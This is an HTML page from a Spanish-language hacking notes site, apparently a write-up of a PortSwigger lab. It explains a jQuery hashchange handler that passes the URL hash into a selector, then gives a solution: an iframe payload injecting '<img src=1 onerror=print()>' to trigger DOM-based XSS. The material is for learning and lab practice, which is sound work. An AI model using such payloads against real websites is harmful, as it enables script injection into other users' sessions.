@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;https://youtu.be/5OiWO5Qr-iI&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>https://youtu.be/5OiWO5Qr-iI</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="nb">window</span><span class="p">).</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">hashchange</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span>
+                            <span class="kd">var</span> <span class="nx">post</span> <span class="o">=</span> <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">section.blog-list h2:contains(</span><span class="dl">'</span> <span class="o">+</span> <span class="nf">decodeURIComponent</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">)</span><span class="dl">'</span><span class="p">);</span>
+                            <span class="k">if </span><span class="p">(</span><span class="nx">post</span><span class="p">)</span> <span class="nx">post</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nf">scrollIntoView</span><span class="p">();</span>
+                        <span class="p">});</span>
+</code></pre></div></div>
+
+<p>Este código es un fragmento de JavaScript que se ejecuta en un entorno de navegador y utiliza jQuery para realizar una acción específica cuando cambia el hash en la URL (es decir, la parte de la URL después del <code class="language-plaintext highlighter-rouge">#</code>). Voy a desglosar lo que hace línea por línea:</p>
+
+<ol>
+  <li>
+    <p><strong><code class="language-plaintext highlighter-rouge">$(window).on('hashchange', function(){</code></strong><br />
+Este código adjunta un controlador de eventos al objeto <code class="language-plaintext highlighter-rouge">window</code> que escucha el evento <code class="language-plaintext highlighter-rouge">hashchange</code>. ==El evento <code class="language-plaintext highlighter-rouge">hashchange</code> se dispara cada vez que el hash en la URL cambia,== es decir, cuando cambias la parte de la URL después del <code class="language-plaintext highlighter-rouge">#</code>.</p>
+  </li>
+  <li>
+    <p><strong><code class="language-plaintext highlighter-rouge">var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');</code></strong><br />
+Aquí se define una variable <code class="language-plaintext highlighter-rouge">post</code> que contiene un elemento del DOM (Document Object Model). Este selector busca un elemento <code class="language-plaintext highlighter-rouge">h2</code> dentro de un <code class="language-plaintext highlighter-rouge">section</code> con la clase <code class="language-plaintext highlighter-rouge">blog-list</code> que contiene el texto del hash actual.</p>
+
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">decodeURIComponent(window.location.hash.slice(1))</code>:
+        <ul>
+          <li><code class="language-plaintext highlighter-rouge">window.location.hash</code> obtiene el hash de la URL actual, incluyendo el <code class="language-plaintext highlighter-rouge">#</code> al inicio.</li>
+          <li><code class="language-plaintext highlighter-rouge">.slice(1)</code> elimina el <code class="language-plaintext highlighter-rouge">#</code> del inicio del hash.</li>
+          <li><code class="language-plaintext highlighter-rouge">decodeURIComponent()</code> decodifica cualquier carácter especial en la URL (como <code class="language-plaintext highlighter-rouge">%20</code> por espacios) en su representación normal.</li>
+        </ul>
+      </li>
+      <li><code class="language-plaintext highlighter-rouge">$('section.blog-list h2:contains(...)')</code>: Este es un selector de jQuery que busca un elemento <code class="language-plaintext highlighter-rouge">h2</code> dentro de la sección con la clase <code class="language-plaintext highlighter-rouge">blog-list</code> que contiene el texto del hash.</li>
+    </ul>
+  </li>
+  <li>
+    <p><strong><code class="language-plaintext highlighter-rouge">if (post) post.get(0).scrollIntoView();</code></strong><br />
+Aquí se verifica si se ha encontrado el elemento <code class="language-plaintext highlighter-rouge">post</code>. Si existe, el código llama al método <code class="language-plaintext highlighter-rouge">scrollIntoView()</code> en ese elemento. Este método desplaza la página automáticamente para que el elemento <code class="language-plaintext highlighter-rouge">h2</code> encontrado sea visible en la ventana del navegador.</p>
+  </li>
+</ol>
+
+<h3 id="resumen">Resumen</h3>
+
+<p>Este código escucha los cambios en el hash de la URL y, cuando detecta uno, busca un encabezado <code class="language-plaintext highlighter-rouge">h2</code> dentro de una sección con la clase <code class="language-plaintext highlighter-rouge">blog-list</code> que contenga el texto correspondiente al hash. Si encuentra tal encabezado, desplaza la página hasta que ese encabezado esté visible.</p>
+
+<p>==Mi explicación :==</p>
+
+<p>window.location.hash -&gt; retorna el valor completo #text
+window.location.hash.slice(1) -&gt; text</p>
+
+<p>A pesar de que no exista el elemento <code class="language-plaintext highlighter-rouge">&lt;img%20src=1%20onerror=print()&gt;</code> , se crea en tiempo de ejecución , no se guarda en el dom.
+var post = $(‘section.blog-list h2:contains(‘ + decodeURIComponent(window.location.hash.slice(1)) + ‘)’);</p>
+
+<p>Solución :</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">iframe</span> 
+  <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">https://0af700c504488d60810d93da00ab0042.web-security-academy.net/</span><span class="dl">"</span> 
+  <span class="nx">onload</span><span class="o">=</span><span class="dl">"</span><span class="s2">this.src+='#&lt;img%20src=1%20onerror=print()&gt;'</span><span class="dl">"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="sr">/iframe</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
